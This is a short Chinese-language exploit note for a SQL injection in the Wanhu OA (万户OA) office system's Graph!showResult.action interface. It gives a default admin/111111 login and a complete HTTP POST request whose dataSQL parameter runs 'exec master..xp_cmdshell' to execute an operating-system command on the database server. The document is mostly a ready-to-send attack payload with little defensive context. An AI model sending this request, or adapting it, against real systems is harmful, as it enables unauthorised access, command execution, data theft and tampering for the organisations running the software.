**默认账号密码：**

admin/111111

**漏洞描述：**

万户OA showResult.action接口未对用户输入进行充分的过滤和验证，攻击者可以通过注入恶意SQL语句的方式绕过身份认证，查询或篡改数据库中的数据。攻击者可以利用该漏洞执行恶意SQL语句，从而获取敏感信息、篡改数据等。

**影响版本：**

万户OA

**Payload：**

```python
POST /defaultroot/Graph!showResult.action HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length:69
Connection: close
Cookie: OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; LocLan=zh_CN; JSESSIONID=5AC1D44965A277C90D94B57DEDA82992; OASESSIONID=5AC1D44965A277C90D94B57DEDA82992; ezofficeDomainAccount=whir; empLivingPhoto=; ezofficeUserName=dsfssaq; ezofficeUserPortal=; ezofficePortal135=1
Upgrade-Insecure-Requests:1

database=localDataSource&dataSQL=exec+master..xp_cmdshell+"ipconfig";
```

---
